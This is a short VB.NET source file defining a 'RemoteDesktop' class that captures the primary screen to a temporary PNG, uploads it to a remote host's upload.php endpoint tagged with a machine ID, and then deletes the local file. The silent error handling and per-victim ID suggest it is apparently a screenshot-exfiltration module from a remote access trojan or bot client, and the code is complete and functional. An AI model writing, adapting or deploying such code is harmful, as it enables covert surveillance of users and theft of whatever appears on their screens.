Imports System.Drawing.Imaging
Namespace Other
    Public Class RemoteDesktop
        Public Host As String
        Public ID As String

        Public Sub Start()
            Try
                TakeScreen(IO.Path.GetTempPath & "/" & ID & ".png")
                Form1.C.Log("Succ", "Screenshot has been uploaded")
            Catch ex As Exception
                Form1.C.Log("Fail", "An unexpected error occurred" & ex.Message)
            End Try
        End Sub
        Private Function Upload(ByVal screenshot As String)
            Try
                My.Computer.Network.UploadFile(screenshot, Host & "/upload.php?id=" & ID)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
        Public Sub TakeScreen(ByVal filename As String)
            Try
                Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
                Dim image As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
                Dim graphics As Graphics = graphics.FromImage(image)
                Dim upperLeftSource As New Point(0, 0)
                Dim upperLeftDestination As New Point(0, 0)
                graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
                graphics.Flush()
                image.Save(filename, ImageFormat.Png)
                If Upload(filename) = True Then
                    IO.File.Delete(filename)
                End If
            Catch ex As Exception

            End Try
        End Sub
    End Class
End Namespace